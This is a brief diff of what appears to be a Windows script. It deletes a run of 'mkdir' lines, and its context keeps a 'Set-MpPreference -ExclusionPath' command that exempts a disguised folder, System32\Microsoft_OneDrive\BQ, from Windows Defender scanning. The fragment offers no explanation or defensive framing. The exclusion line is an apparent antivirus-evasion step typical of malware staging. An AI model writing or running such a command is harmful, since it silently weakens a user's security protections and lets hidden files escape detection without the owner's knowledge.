@@ -54,26 +54,6 @@ mkdir BW
 mkdir BX
 mkdir BY
 mkdir BZ
-mkdir Ba
-mkdir Bb
-mkdir Bc
-mkdir Bd
-mkdir Be
-mkdir Bf
-mkdir Bg
-mkdir Bh
-mkdir Bi
-mkdir Bj
-mkdir Bk
-mkdir Bl
-mkdir Bm
-mkdir Bn
-mkdir Bo
-mkdir Bp
-mkdir Bq
-mkdir Br
-mkdir Bs
-mkdir Bt
 Set-MpPreference -ExclusionPath $env:SystemRoot\System32\Microsoft_OneDrive\BQ
 
 
